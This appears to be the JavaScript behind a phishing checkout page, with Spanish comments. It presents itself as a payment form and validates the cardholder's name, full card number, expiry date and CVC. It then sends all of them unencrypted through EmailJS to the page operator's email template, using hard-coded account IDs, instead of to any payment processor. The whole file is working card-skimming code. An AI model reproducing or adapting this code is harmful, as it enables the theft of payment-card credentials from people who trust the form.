(function() {
    emailjs.init('ReqtkWfjI392LAzFb'); // Tu Public Key de EmailJS
})();

document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    e.target.value = value.substring(0, 19);
});

document.getElementById('paymentForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const loader = document.getElementById('loader');
    const errorMsg = document.getElementById('errorMsg');
    
    // Resetear mensajes
    errorMsg.classList.add('hidden');
    document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');

    // Recoger datos
    const formData = {
        nombre: document.getElementById('userName').value.trim(),
        numero: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        fecha: document.getElementById('expiryDate').value,
        cvc: document.getElementById('cvc').value
    };

    // Validaciones
    let isValid = true;

    if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.nombre)) {
        showError('nameError', 'Nombre completo requerido');
        isValid = false;
    }

    if (!/^\d{16}$/.test(formData.numero)) {
        showError('cardError', 'Tarjeta inválida (16 dígitos)');
        isValid = false;
    }

    const currentDate = new Date();
    const expiryDate = new Date(formData.fecha);
    if (expiryDate < currentDate) {
        showError('dateError', 'Fecha expirada');
        isValid = false;
    }

    if (!/^\d{4}$/.test(formData.cvc)) {
        showError('cvcError', 'CVC inválido (4 dígitos)');
        isValid = false;
    }

    if (!isValid) {
        errorMsg.textContent = '⚠️ Por favor corrige los errores';
        errorMsg.classList.remove('hidden');
        return;
    }

    loader.classList.remove('hidden');

    try {
        await emailjs.send(
            "service_syrc1uk",   // Service ID
            "template_u3etoro",  // Template ID
            formData
        );
        
        window.location.href = "thank-you.html";
    } catch (error) {
        console.error('Error:', error);
        errorMsg.textContent = '❌ Error al verificar. Intenta nuevamente.';
        errorMsg.classList.remove('hidden');
    } finally {
        loader.classList.add('hidden');
    }
});

function showError(elementId, message) {
    const element = document.getElementById(elementId);
    element.textContent = message;
    element.style.display = 'block';
}
